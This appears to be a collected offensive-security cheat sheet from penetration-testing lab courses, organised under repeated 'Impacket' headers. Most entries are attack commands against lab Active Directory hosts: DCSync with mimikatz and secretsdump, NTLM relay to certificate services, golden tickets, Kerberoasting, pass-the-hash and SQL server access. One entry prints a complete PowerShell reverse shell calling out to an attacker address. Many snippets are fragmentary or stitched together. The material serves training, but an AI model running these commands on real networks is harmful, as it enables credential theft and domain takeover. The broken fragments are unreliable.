## Impacket - Impacket - Impacket - Impacket - Impacket - listing-hashes-kerberos-keys-and-cleartext-passwords
#cat/ATTACK #cpts
```
ls inlanefreight_hashes*
```

## Impacket - Impacket - Impacket - Impacket - Impacket - enumerating-further-using-get-aduser
#cat/ATTACK #cpts
```
DistinguishedName : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
```

## Impacket - Impacket - Impacket - Impacket - Impacket - checking-for-reversible-encryption-option-using-get-domainuser
#cat/ATTACK #cpts
```
samaccountname useraccountcontrol
```

## Impacket - Impacket - Impacket - Impacket - Impacket - displaying-the-decrypted-password
#cat/ATTACK #cpts
```
cat inlanefreight_hashes.ntds.cleartext
```

## Impacket - Impacket - Impacket - Impacket - Impacket - using-runasexe
#cat/ATTACK #cpts
```
(c) 2018 Microsoft Corporation. All rights reserved.
```

## Impacket - Impacket - Impacket - Impacket - Impacket - performing-the-attack-with-mimikatz
#cat/ATTACK #cpts
```
mimikatz # privilege::debug
```

## Impacket - Impacket - Impacket - Impacket - Impacket - performing-the-attack-with-mimikatz-2
#cat/ATTACK #cpts
```
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

## Impacket - Impacket - Impacket - Impacket - Impacket - displaying-mssqlclientpy-options
#cat/ATTACK #cpts
Privileged Access

```
mssqlclient.py
```

## Impacket - Impacket - Impacket - Impacket - Impacket - displaying-mssqlclientpy-options-2
#cat/ATTACK #cpts
Privileged Access

```
Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation
```

## Impacket - Impacket - Impacket - Impacket - Impacket - running-mssqlclientpy-against-the-target
#cat/ATTACK #cpts
Privileged Access

```
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```

## Impacket - Impacket - Impacket - Impacket - Impacket - running-mssqlclientpy-against-the-target-2
#cat/ATTACK #cpts
Privileged Access

```
Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
```

## Impacket - Impacket - Impacket - Impacket - Impacket - workaround-2-register-pssession-configuration
#cat/ATTACK #cpts
If we check for cached tickets using `klist`, we'll see that the same problem exists. Due to the double hop problem, we can only interact with resources in our current session but cannot access the DC directly using Powe

```
[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> klist
```

## Impacket - Impacket - Impacket - Impacket - Impacket - workaround-2-register-pssession-configuration-2
#cat/ATTACK #cpts
We also cannot interact directly with the DC using PowerView Kerberos "Double Hop" Problem

```
[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> get-domainuser -spn | select samaccountname
```

## Impacket - Impacket - Impacket - Impacket - Impacket - workaround-2-register-pssession-configuration-3
#cat/ATTACK #cpts
One trick we can use here is registering a new session configuration using the [Register-PSSessionConfiguration](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/register-pssessionconfiguratio

```
PowerShell runspace configuration is restricted to only the necessary set of cmdlets and capabilities.
```

## Impacket - Impacket - Impacket - Impacket - Impacket - workaround-2-register-pssession-configuration-4
#cat/ATTACK #cpts
Once this is done, we need to restart the WinRM service by typing `Restart-Service WinRM` in our current PSSession. This will kick us out, so we'll start a new PSSession using the named registered session we set up previ

```
[DEV01]: PS C:\Users\backupadm\Documents> klist
```

## Impacket - Impacket - Impacket - Impacket - Impacket - workaround-2-register-pssession-configuration-5
#cat/ATTACK #cpts
We can now run tools such as PowerView without having to create a new PSCredential object. Kerberos "Double Hop" Problem

```
[DEV01]: PS C:\Users\Public> get-domainuser -spn | select samaccountname
```

## Impacket - Impacket - Impacket - Impacket - Impacket - using-nopac-to-dcsync-the-built-in-administrator-account
#cat/ATTACK #cpts
```
[!bash!]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

## Impacket - Impacket - Impacket - Impacket - Impacket - starting-ntlmrelayxpy
#cat/ATTACK #cpts
```
[!bash!]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```

## Impacket - Impacket - Impacket - Impacket - Impacket - starting-ntlmrelayxpy-2
#cat/ATTACK #cpts
```
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a
```

## Impacket - Impacket - Impacket - Impacket - Impacket - catching-base64-encoded-certificate-for-dc01
#cat/ATTACK #cpts
Back in our other window, we will see a successful login request and obtain the base64 encoded certificate for the Domain Controller if the attack is successful.

```
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
```

## Impacket - Impacket - Impacket - Impacket - Impacket - requesting-a-tgt-using-gettgtpkinitpy
#cat/ATTACK #cpts
Next, we can take this base64 certificate and use `gettgtpkinit.py` to request a Ticket-Granting-Ticket (TGT) for the domain controller.

```
[!bash!]$ python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
```

## Impacket - Impacket - Impacket - Impacket - Impacket - using-domain-controller-tgt-to-dcsync
#cat/ATTACK #cpts
We can then use this TGT with `secretsdump.py` to perform a DCSync and retrieve one or all of the NTLM password hashes for the domain.

```
[!bash!]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

## Impacket - Impacket - Impacket - Impacket - Impacket - using-domain-controller-ntlm-hash-to-dcsync
#cat/ATTACK #cpts
```
[!bash!]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
```

## Impacket - Impacket - Impacket - Impacket - Impacket - performing-dcsync-with-mimikatz
#cat/ATTACK #cpts
```
mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt
```

## Impacket - Impacket - Impacket - Impacket - Impacket - hunting-for-users-with-kerberos-pre-auth-not-required
#cat/ATTACK #cpts
Miscellaneous Misconfigurations

```
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
```

## Impacket - Impacket - Impacket - Impacket - Impacket - hunting-for-users-with-kerberos-pre-auth-not-required-2
#cat/ATTACK #cpts
Miscellaneous Misconfigurations

```
$krb5asrep$23$mmorgan@inlanefreight.local@INLANEFREIGHT.LOCAL:47e0d517f2a5815da8345dd9247a0e3d$b62d45bc3c0f4c306402a205ebdbbc623d77ad016e657337630c70f651451400329545fb634c9d329ed024ef145bdc2afd4af498b2f0092766effe6ae12b3c3beac28e6ded0b542e85d3fe52467945d98a722cb52e2b37325a53829ecf127d10ee98f8a583d7912e6ae3c702b946b65153bac16c97b7f8f2d4c2811b7feba92d8bd99cdeacc8114289573ef225f7c2913647db68aafc43a1c98aa032c123b2c9db06d49229c9de94b4b476733a5f3dc5cc1bd7a9a34c18948edf8c9c124c52a36b71d2b1ed40e081abbfee564da3a0ebc734781fdae75d3882f3d1d68afdb2ccb135028d70d1aa3c0883165b3321e7a1c5c8d7c215f12da8bba9
```

## Impacket - Impacket - Impacket - Impacket - Impacket - obtaining-the-krbtgt-accounts-nt-hash-using-mimikatz
#cat/ATTACK #cpts
Attacking Domain Trusts - Child -> Parent Trusts - from Windows

```
[DC] 'LOGISTICS.INLANEFREIGHT.LOCAL' will be the domain
```

## Impacket - Impacket - Impacket - Impacket - Impacket - performing-a-dcsync-attack
#cat/ATTACK #cpts
Attacking Domain Trusts - Child -> Parent Trusts - from Windows

```
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
```

## Impacket - Impacket - Impacket - Impacket - Impacket - performing-a-dcsync-attack-2
#cat/ATTACK #cpts
When dealing with multiple domains and our target domain is not the same as the user's domain, we will need to specify the exact domain to perform the DCSync operation on the particular domain controller. The command for

```
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

## Impacket - Impacket - Impacket - Impacket - Impacket - performing-dcsync-with-secretsdumppy
#cat/ATTACK #cpts
Attacking Domain Trusts - Child -> Parent Trusts - from Linux

```
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```

## Impacket - Impacket - Impacket - Impacket - Impacket - performing-sid-brute-forcing-using-lookupsidpy
#cat/ATTACK #cpts
Attacking Domain Trusts - Child -> Parent Trusts - from Linux

```
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
```

## Impacket - Impacket - Impacket - Impacket - Impacket - looking-for-the-domain-sid
#cat/ATTACK #cpts
Attacking Domain Trusts - Child -> Parent Trusts - from Linux

```
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
```

## Impacket - Impacket - Impacket - Impacket - Impacket - grabbing-the-domain-sid-attaching-to-enterprise-admins-rid
#cat/ATTACK #cpts
Attacking Domain Trusts - Child -> Parent Trusts - from Linux

```
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```

## Impacket - Impacket - Impacket - Impacket - Impacket - constructing-a-golden-ticket-using-ticketerpy
#cat/ATTACK #cpts
Attacking Domain Trusts - Child -> Parent Trusts - from Linux

```
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```

## Impacket - Impacket - Impacket - Impacket - Impacket - getting-a-system-shell-using-impackets-psexecpy
#cat/ATTACK #cpts
Attacking Domain Trusts - Child -> Parent Trusts - from Linux

```
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```

## Impacket - Impacket - Impacket - Impacket - Impacket - performing-the-attack-with-raisechildpy
#cat/ATTACK #cpts
Attacking Domain Trusts - Child -> Parent Trusts - from Linux

```
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```

## Impacket - Impacket - Impacket - Impacket - Impacket - using-getuserspnspy
#cat/ATTACK #cpts
Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

```
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

## Impacket - Impacket - Impacket - Impacket - Impacket - using-the--request-flag
#cat/ATTACK #cpts
Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

```
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

## Impacket - Impacket - Impacket - Impacket - Impacket - using-the--request-flag-2
#cat/ATTACK #cpts
Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

```
$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/mssqlsvc*$10
```

## Impacket - Impacket - Impacket - Impacket - Impacket - create-the-smb-server
#cat/ATTACK #cpts
Windows File Transfer Methods

```
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

## Impacket - Impacket - Impacket - Impacket - Impacket - invoke-aesencryptionps1-27
#cat/ATTACK #cpts
Protected File Transfers

```
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Path file.bin.aes
```

## Impacket - Impacket - Impacket - Impacket - Impacket - file-share
#cat/ATTACK #cpts
Using `smbclient`, we can display a list of the server's shares with the option `-L`, and using the option `-N`, we tell `smbclient` to use the null session. Attacking SMB

```
smbclient -N -L //10.129.14.128
```

## Impacket - Impacket - Impacket - Impacket - Impacket - impacket-psexec
#cat/ATTACK #cpts
To use `impacket-psexec`, we need to provide the domain/username, the password, and the IP address of our target machine. For more detailed information we can use impacket help: Attacking SMB

```
impacket-psexec -h
```

## Impacket - Impacket - Impacket - Impacket - Impacket - impacket-psexec-2
#cat/ATTACK #cpts
To use `impacket-psexec`, we need to provide the domain/username, the password, and the IP address of our target machine. For more detailed information we can use impacket help: Attacking SMB

```
PSEXEC like functionality example using RemComSvc.
```

## Impacket - Impacket - Impacket - Impacket - Impacket - impacket-psexec-3
#cat/ATTACK #cpts
To use `impacket-psexec`, we need to provide the domain/username, the password, and the IP address of our target machine. For more detailed information we can use impacket help: Attacking SMB

```
command command (or arguments if -c is used) to execute at the target (w/o path) - (default:cmd.exe)
```

## Impacket - Impacket - Impacket - Impacket - Impacket - impacket-psexec-4
#cat/ATTACK #cpts
To connect to a remote machine with a local administrator account, using `impacket-psexec`, you can use the following command: Attacking SMB

```
(c) Microsoft Corporation. All rights reserved.
```

## Impacket - Impacket - Impacket - Impacket - Impacket - sqlcmd---connecting-to-the-sql-server
#cat/ATTACK #cpts
Alternatively, we can use the tool from Impacket with the name `mssqlclient.py`. Attacking SQL Databases

```
mssqlclient.py -p 1433 julio@10.129.203.7
```

## Impacket - Impacket - Impacket - Impacket - Impacket - take-over-the-domain-and-submit-the-contents-of-the-flagtxt-file-on-th
#cat/ATTACK #cpts
```
└──╼ [★]$ proxychains sudo secretsdump.py INLANEFREIGHT/tpetty@172.16.6.3 -just-dc-user administrator
```

## Impacket - Impacket - Impacket - Impacket - Impacket - take-over-the-domain-and-submit-the-contents-of-the-flagtxt-file-on-th-2
#cat/ATTACK #cpts
Subsequently, students need to use `wmiexec.py` as `administrator` and pass the hash `aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0` to be able to connect to DC01. Students will find the flag in `C:\u

```
hostname
```

## Impacket - Impacket - Impacket - Impacket - Impacket - take-over-the-domain-and-submit-the-contents-of-the-flagtxt-file-on-th-3
#cat/ATTACK #cpts
```
└──╼ [★]$ proxychains wmiexec.py administrator@172.16.6.3 -hashes aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0
```

## Impacket - Impacket - Impacket - Impacket - Impacket - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o
#cat/ATTACK #cpts
From the ParrotOS jump-box, students need to use `mssqlclient.py` to connect to the `MSSQL` database at `172.16.7.60`:

```
mssqlclient.py netdb:D@ta_bAse_adm1n\!@172.16.7.60
```

## Impacket - Impacket - Impacket - Impacket - Impacket - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-2
#cat/ATTACK #cpts
At last, students can authenticate as the local administrator to retrieve the flag, using the credentials `administrator:Welcome1`:

```
smbclient -U "administrator" \\\\172.16.7.60\\C$
```

## Impacket - Impacket - Impacket - Impacket - Impacket - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-3
#cat/ATTACK #cpts
At last, students can authenticate as the local administrator to retrieve the flag, using the credentials `administrator:Welcome1`:

```
cd Users\Administrator\Desktop\
```

## Impacket - Impacket - Impacket - Impacket - Impacket - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-4
#cat/ATTACK #cpts
At last, students can authenticate as the local administrator to retrieve the flag, using the credentials `administrator:Welcome1`:

```
cat flag.txt
```

## Impacket - Impacket - Impacket - Impacket - Impacket - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-5
#cat/ATTACK #cpts
```
└──╼ $smbclient -U "administrator" \\\\172.16.7.60\\C$
```

## Impacket - Impacket - Impacket - Impacket - Impacket - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-6
#cat/ATTACK #cpts
Now, students have the password for Domain Administrator; thereafter, students can obtain the flag using a number of ways, `wmiexec.py` will be used to connect to DC01 and print out the flag file:

```
wmiexec.py administrator@172.16.7.3
```

## Impacket - Impacket - Impacket - Impacket - Impacket - submit-the-ntlm-hash-for-the-krbtgt-account-for-the-target-domain-afte
#cat/ATTACK #cpts
Students need to `DCSync` the KRBTGT NTLM hash with `secretsdump.py`, finding it to be `7eba70412d81c1cd030d72a3e8dbe05f`:

```
secretsdump.py administrator@172.16.7.3 -just-dc-user KRBTGT
```

## Impacket - Impacket - Impacket - Impacket - Impacket - submit-the-ntlm-hash-for-the-krbtgt-account-for-the-target-domain-afte-2
#cat/ATTACK #cpts
```
└──╼ $secretsdump.py administrator@172.16.7.3 -just-dc-user KRBTGT
```

## Impacket - Impacket - Impacket - Impacket - Impacket - smb
#cat/ATTACK #cpts
If the vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need the `allow_url_include` setting to be enabled for RFI exploita

```
impacket-smbserver -smb2support share $(pwd)
```

## Impacket - Impacket - Impacket - Impacket - Impacket - smb-2
#cat/ATTACK #cpts
If the vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need the `allow_url_include` setting to be enabled for RFI exploita

```
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
```

## Impacket - Impacket - Impacket - Impacket - Impacket - what-ad-user-has-a-rid-equal-to-decimal-1170
#cat/ATTACK #cpts
```
└──╼ $rpcclient -U "" -N 172.16.5.5
```

## Impacket - Impacket - Impacket - Impacket - Impacket - what-ad-user-has-a-rid-equal-to-decimal-1170-2
#cat/ATTACK #cpts
```
rpcclient $>
```

## Impacket - Impacket - Impacket - Impacket - Impacket - what-ad-user-has-a-rid-equal-to-decimal-1170-3
#cat/ATTACK #cpts
```
rpcclient $> queryuser 1170
```

## Impacket - Impacket - Impacket - Impacket - Impacket - retrieve-the-tgs-ticket-for-the-sapservice-account-crack-the-ticket-of
#cat/ATTACK #cpts
```
└──╼ $GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```

## Impacket - Impacket - Impacket - Impacket - Impacket - retrieve-the-tgs-ticket-for-the-sapservice-account-crack-the-ticket-of-2
#cat/ATTACK #cpts
```
$krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SAPService*$c10f3438e08b2ea6d1e594f86f9a3098$061ffe6405f28cf4bf3cd6e1fe62afd134b10328462bd492a2550e6c071366a8f1034f75dfb5c0c5d80ecdbbe762b1d6f2cb280b6755f7ac4cde11ddfb49bbb16ee699a4c1961f40639e6ad2927969205bfba3116bd776a344de16a08d39ab2dab2d896e7b0f6612366107209903ae458843ab68c524df206aa3af095fcbd01783e805536351926405aef89d036377c1945b7cc3769be49589e2b9fb7e7f63b2847fee13e463bc472de19d64660780f6ab7ce6d47134eefabdc3d30855daef98350d4751fbf477bc887334a628ab176eb9358580bb952cf678a0125d94d3a593eecd7105f5b16ad57f702db3e4521775beb258f8982
```

## Impacket - Impacket - Impacket - Impacket - Impacket - what-powerful-local-group-on-the-domain-controller-is-the-sapservice-u
#cat/ATTACK #cpts
Using the same SSH connection established in the previous question, students need to run `GetUserSPNs.py` and specify the `SAPService` user (with its password being `!SapperFi2`); students will know from the output that

```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/SAPService
```

## Impacket - Impacket - Impacket - Impacket - Impacket - what-powerful-local-group-on-the-domain-controller-is-the-sapservice-u-2
#cat/ATTACK #cpts
```
└──╼ $GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/SAPService
```

## Impacket - Impacket - Impacket - Impacket - Impacket - perform-a-dcsync-attack-and-look-for-another-user-with-the-option-stor-2
#cat/ATTACK #cpts
```
shell-session
```

## Impacket - Impacket - Impacket - Impacket - Impacket - perform-a-dcsync-attack-and-look-for-another-user-with-the-option-stor-3
#cat/ATTACK #cpts
When prompted with the "Computer Access Policy" message, students need to click on "OK". Once they access the spawned target machine, students need to close `Server Manager`. Then, students need to run `PowerShell` as Ad

```
cd C:\Tools\
```

## Impacket - Impacket - Impacket - Impacket - Impacket - perform-a-dcsync-attack-and-look-for-another-user-with-the-option-stor-4
#cat/ATTACK #cpts
When prompted with the "Computer Access Policy" message, students need to click on "OK". Once they access the spawned target machine, students need to close `Server Manager`. Then, students need to run `PowerShell` as Ad

```
Import-Module .\PowerView.ps1
```

## Impacket - Impacket - Impacket - Impacket - Impacket - perform-a-dcsync-attack-and-look-for-another-user-with-the-option-stor-5
#cat/ATTACK #cpts
Students then need to check for `Reversible Encryption` options assigned to users by using `Get-DomainUser`:

```
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol
```

## Impacket - Impacket - Impacket - Impacket - Impacket - what-is-this-users-cleartext-password
#cat/ATTACK #cpts
Students need to perform a `DCSync` attack using `mimikatz`:

```
lsadump::dcsync /user:INLANEFREIGHT\syncron
```

## Impacket - Impacket - Impacket - Impacket - Impacket - what-is-this-users-cleartext-password-2
#cat/ATTACK #cpts
```
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\syncron
```

## Impacket - Impacket - Impacket - Impacket - Impacket - perform-a-dcsync-attack-and-submit-the-ntlm-hash-for-the-khartsfield-u
#cat/ATTACK #cpts
Using the same `xfreerdp` connection established in the first question, students need to open `Command Prompt` and run the following `runas` command (providing the password `SyncMaster57` when prompted to):

```
runas /netonly /user:INLANEFREIGHT\adunn powershell
```

## Impacket - Impacket - Impacket - Impacket - Impacket - perform-a-dcsync-attack-and-submit-the-ntlm-hash-for-the-khartsfield-u-2
#cat/ATTACK #cpts
```
Enter the password for INLANEFREIGHT\adunn:SyncMaster757
```

## Impacket - Impacket - Impacket - Impacket - Impacket - perform-a-dcsync-attack-and-submit-the-ntlm-hash-for-the-khartsfield-u-3
#cat/ATTACK #cpts
Students will then attain a `PowerShell` session as the user `adunn`: Afterward, they will need then to change directories to `C:\Tools\mimikatz\x64\`:

```
cd C:\Tools\mimikatz\x64\
```

## Impacket - Impacket - Impacket - Impacket - Impacket - perform-a-dcsync-attack-and-submit-the-ntlm-hash-for-the-khartsfield-u-4
#cat/ATTACK #cpts
And then run `mimikatz`:

```
.\mimikatz.exe
```

## Impacket - Impacket - Impacket - Impacket - Impacket - perform-a-dcsync-attack-and-submit-the-ntlm-hash-for-the-khartsfield-u-5
#cat/ATTACK #cpts
```
mimikatz #
```

## Impacket - Impacket - Impacket - Impacket - Impacket - perform-a-dcsync-attack-and-submit-the-ntlm-hash-for-the-khartsfield-u-6
#cat/ATTACK #cpts
Students need to use `mimikatz` to perform a `DCSync` attack; students will find out that the `NTLM` hash is `4bb3b317845f0954200a6b0acc9b9f9a` for the user `khartsfield`:

```
lsadump::dcsync /user:INLANEFREIGHT\khartsfield
```

## Impacket - Impacket - Impacket - Impacket - Impacket - perform-a-dcsync-attack-and-submit-the-ntlm-hash-for-the-khartsfield-u-7
#cat/ATTACK #cpts
```
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\khartsfield
```

## Impacket - Impacket - Impacket - Impacket - Impacket - leverage-sqladmin-rights-to-authenticate-to-the-academy-ea-db01-host-1
#cat/ATTACK #cpts
```
└──╼ $mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```

## Impacket - Impacket - Impacket - Impacket - Impacket - perform-the-extrasids-attack-to-compromise-the-parent-domain-from-the-
#cat/ATTACK #cpts
```
└──╼ $raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```

## Impacket - Impacket - Impacket - Impacket - Impacket - perform-the-extrasids-attack-to-compromise-the-parent-domain-from-the--2
#cat/ATTACK #cpts
Then, students need to use the administrator's NTLM hash to `DCsync` and `grep` for the `bross` user:

```
secretsdump.py inlanefreight.local/administrator@172.16.5.5 -hashes aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf -just-dc | grep bross
```

## Impacket - Impacket - Impacket - Impacket - Impacket - perform-the-extrasids-attack-to-compromise-the-parent-domain-from-the--3
#cat/ATTACK #cpts
```
└──╼ $secretsdump.py inlanefreight.local/administrator@172.16.5.5 -hashes aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf -just-dc | grep bross
```

## Impacket - Impacket - Impacket - Impacket - Impacket - kerberoast-across-the-forest-trust-from-the-linux-attack-host-submit-t
#cat/ATTACK #cpts
Students then need to use `GetUserSPNs.py`, supplying it the credentials `wley:transporter@4`:

```
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT/wley
```

## Impacket - Impacket - Impacket - Impacket - Impacket - kerberoast-across-the-forest-trust-from-the-linux-attack-host-submit-t-2
#cat/ATTACK #cpts
```
└──╼ $GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT/wley
```

## Impacket - Impacket - Impacket - Impacket - Impacket - crack-the-tgs-and-submit-the-cleartext-password-as-your-answer
#cat/ATTACK #cpts
Using the same SSH connection established in the previous question, students need to use `GetUsersSPNs`, supplying it the credentials `wley:transporter@4`:

```
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL -request-user sapsso INLANEFREIGHT.LOCAL/wley
```

## Impacket - Impacket - Impacket - Impacket - Impacket - crack-the-tgs-and-submit-the-cleartext-password-as-your-answer-2
#cat/ATTACK #cpts
```
└──╼ $GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL -request-user sapsso INLANEFREIGHT.LOCAL/wley
```

## Impacket - Impacket - Impacket - Impacket - Impacket - crack-the-tgs-and-submit-the-cleartext-password-as-your-answer-3
#cat/ATTACK #cpts
```
$krb5tgs$23$*sapsso$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/sapsso*$27b5e2726f7c8d87470dc5c768531baf$2a10f36b3ad51260581175e9eb893b7e8b486b10cde5a4900678135297bd5f7fa6d9a455ac69a3996b31d43684c48b496b4de0d41e76aa4b58cfd8638536aebfe5af17994c14e5a86c269a7480862c44cdfb576278b5c544e36fed5fccfdfc0d7f89fed1e32743e64488f2f964e2acfb9348027a9cdf136393de809dbeeddd9c76c7aacb532a6e446dcf216ad4616bb901f11a8470742ff1cd4fcea2884d71feeaa78fad908b5c67525aba50e76a92319e8483befa6b2f4f718e03110c539839173bd6c83ab328267e50c7dbb429b2c51288c72f828bc14d67bc0956589ee8702d314f48ab35656807403e396c5ed2d3414443a9b243a
```

## Impacket - Impacket - Impacket - Impacket - Impacket - burp-post-request
#cat/ATTACK #cpts
Finally, we can decode the b64 string and execute it with a PowerShell sub-shell (`iex "$()"`), as follows:

```
21y4d
```

## Impacket - Impacket - Impacket - Impacket - Impacket - drupalgeddon3
#cat/ATTACK #cpts
[Drupalgeddon3](https://github.com/rithchard/Drupalgeddon3) is an authenticated remote code execution vulnerability that affects [multiple versions](https://www.drupal.org/sa-core-2018-004) of Drupal core. It requires a

```
msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195
```

## Impacket - Impacket - Impacket - Impacket - Impacket - abusing-built-in-functionality
#cat/ATTACK #cpts
The `bin` directory will contain any scripts that we intend to run (in this case, a PowerShell reverse shell), and the default directory will have our `inputs.conf` file. Our reverse shell will be a PowerShell one-liner.

```
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535 | %{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## Impacket - Impacket - Impacket - Impacket - Impacket - sql-injection
#cat/ATTACK #cpts
The above query succeeds and returns the first record in the database. The server then creates a new user object with the obtained results.

```
java
```

## Impacket - Impacket - Impacket - Impacket - Impacket - connecting-with-mssqlclientpy
#cat/ATTACK #cpts
Using the credentials `sql_dev:Str0ng_P@ssw0rd!`, let's first connect to the SQL server instance and confirm our privileges. We can do this using [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/ex

```
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```

## Impacket - Impacket - Impacket - Impacket - Impacket - connecting-with-mssqlclientpy-2
#cat/ATTACK #cpts
Using the credentials `sql_dev:Str0ng_P@ssw0rd!`, let's first connect to the SQL server instance and confirm our privileges. We can do this using [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/ex

```
Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation
```

## Impacket - Impacket - Impacket - Impacket - Impacket - extracting-hashes-using-secretsdump
#cat/ATTACK #cpts
We can also use `SecretsDump` offline to extract hashes from the `ntds.dit` file obtained earlier. These can then be used for pass-the-hash to access additional resources or cracked offline using `Hashcat` to gain furthe

```
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

## Impacket - Impacket - Impacket - Impacket - Impacket - extracting-hashes-using-secretsdump-2
#cat/ATTACK #cpts
We can also use `SecretsDump` offline to extract hashes from the `ntds.dit` file obtained earlier. These can then be used for pass-the-hash to access additional resources or cracked offline using `Hashcat` to gain furthe

```
Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation
```

## Impacket - Impacket - Impacket - Impacket - Impacket - retrieving-ntlm-password-hashes-from-the-domain-controller
#cat/ATTACK #cpts
```
secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
```

